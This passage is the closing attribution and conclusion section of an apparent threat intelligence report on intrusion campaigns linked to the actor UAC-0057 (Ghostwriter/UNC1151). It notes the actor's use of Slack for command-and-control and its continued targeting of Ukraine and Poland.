As outlined in this section, we observed noticeable similarities with activity attributed by other vendors or governmental organisations to UNC1151, Ghostwriter, FrostyNeighbor or UAC-0057. However, due to our limited visibility on current and past operations of UAC-0057, it would not be reasonable to attribute the described activities with high confidence.

## Conclusion: minor evolutions to disciplined targeting

Our investigation highlights multiple similarities and overlaps in tooling and infrastructure that are used in the described intrusion campaigns. We further determined that the techniques, supporting infrastructure and targeting all align with publicly reported activities that are associated with UAC-0057.

Compared to previously reported facts, and although many techniques remain unchanged, we observed some evolution of UAC-0057’s toolset and practices, including the use of Slack for some C2 communication, as well as a transition to other top-level domains to support their C2 infrastructure. These minor changes suggest that UAC-0057 may be exploring alternatives, in a likely attempt to work around detection, but prioritizes the continuity or development of its operations over stealthiness and sophistication.

As it has been demonstrated by previous reporting over the years, UAC-0057 has consistently been targeting Ukraine and Poland among other neighboring countries, and we expect to observe similar activity directed towards Ukrainian and Polish organisations or individuals in the future with a possible extension to some other countries in Europe.
